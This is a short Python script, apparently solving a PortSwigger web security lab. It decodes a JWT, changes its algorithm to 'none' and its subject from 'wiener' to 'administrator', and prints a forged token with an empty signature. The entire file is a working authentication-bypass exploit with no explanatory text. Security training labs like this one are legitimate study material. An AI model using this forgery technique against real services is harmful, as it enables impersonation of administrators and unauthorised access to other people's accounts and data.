import base64
import json

def base64_decode(b64):
	decode = base64.b64decode(b64 + '='*(len(b64)%4)).decode()
	return json.loads(decode)

def base64_encode(string):
	raw_string = json.dumps(string)
	b64 = base64.b64encode(raw_string.encode())
	return b64.decode().split('=')[0]

jwt = "eyJraWQiOiIxODMyOWU4NS1jM2NhLTQ2NDMtYmViZi0zMTgxMDBmZDk4OWIiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsInN1YiI6IndpZW5lciIsImV4cCI6MTY2ODk1OTI5Mn0.X9Zz_FxGRfz93Ej7AP1NLM0ZekFvRjM8zmRfYI_WoKwLgXFTwrufXkN_9wIVIDWfdskarGj4PcS8XXjSDD0PXw6hVt8J4SWrZAkkiIDBOvIawO95oWt2BIO98C1KmmCthIcY-wszhnrk7xyGEqAz0FjF_12dSk8ExWmzBu6_E2W1t8bfKFxt3T2Tq3_frCGNkRx_frceuJxLg7jweTJ6LEVDiSxmd5O1RoN0-3K_S7LPmRzwIpmO63y_8lPd_3ZUzFo89J5rxTzdESGPSLaOtVbD72j-Z_RFMKv0ZsLUmUtMkD8PJNlKxZ-qaBHHUBBh3-meYVlqqBYPF10kmxOfLA"
header, payload, sig = jwt.split('.')

header_decode = base64_decode(header)
payload_decode = base64_decode(payload)

print(header_decode)
print(payload_decode)

header_decode['alg'] = 'none'
payload_decode['sub'] = 'administrator'

print(header_decode)
print(payload_decode)

header_encode = base64_encode(header_decode)
payload_encode = base64_encode(payload_decode)

print('*'*50)
print(f"{header_encode}.{payload_encode}.")